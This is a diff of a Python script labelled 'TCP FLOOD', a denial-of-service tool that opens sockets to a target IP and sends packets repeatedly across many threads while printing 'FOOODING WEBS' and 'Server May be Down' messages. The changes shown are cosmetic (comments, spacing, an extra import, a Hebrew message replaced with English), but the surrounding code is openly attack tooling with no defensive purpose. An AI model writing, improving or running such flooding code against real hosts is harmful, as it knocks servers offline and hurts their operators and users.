@@ -1,14 +1,18 @@
 # _*_ coding: utf-8 _*_
+# progressbar  - Text progress bar library for Python.
+#TCP FLOOD
 import os
 import socket
 import threading
 import time
 import random
 import string
+import datetime
 import progressbar
 
+
 # Colors
-class bcolors:
+class bcolors: 
     HEADER = '\033[95m'
     OKBLUE = '\033[94m'
     OKCYAN = '\033[96m'
@@ -92,15 +96,15 @@ def start():
       for i in range(packs):
         s.send(r)
         u += 1
-        print("\033[92m[" +str(u)+ "] \033[32m[FOOODING WEBS]  \033[97mTarget: " +ip+ "  \033[0m")
-        print("\033[93m[" +str(u)+ "] \033[33m[FOOODING WEBS]  \033[92mTarget: " +ip+ "  \033[0m")
-        print("\033[94m[" +str(u)+ "] \033[34m[FOOODING WEBS]  \033[93mTarget: " +ip+ "  \033[0m")
-        print("\033[95m[" +str(u)+ "] \033[35m[FOOODING WEBS]  \033[36mTarget: " +ip+ "  \033[0m")
-        print("\033[96m[" +str(u)+ "] \033[36m[FOOODING WEBS]  \033[31mTarget: " +ip+ "  \033[0m")
+        print("\033[92m[" +str(u)+ "]  \033[32m[FOOODING WEBS]  \033[97mTarget: " +ip+ "  \033[0m")
+        print("\033[93m[" +str(u)+ "]  \033[33m[FOOODING WEBS]  \033[92mTarget: " +ip+ "  \033[0m")
+        print("\033[94m[" +str(u)+ "]  \033[34m[FOOODING WEBS]  \033[93mTarget: " +ip+ "  \033[0m")
+        print("\033[95m[" +str(u)+ "]  \033[35m[FOOODING WEBS]  \033[36mTarget: " +ip+ "  \033[0m")
+        print("\033[96m[" +str(u)+ "]  \033[36m[FOOODING WEBS]  \033[31mTarget: " +ip+ "  \033[0m")
         
     except:
         s.close()
-        print("\033[97m[💥\033[97m] \033[97mמציפים למטה")
+        print("\033[97m[+\033[97m]  \033[32mServer \033[1mMay be \033[33mDown  \033[0m")
         
 for x in range(thread):
   thred = threading.Thread(target=start)
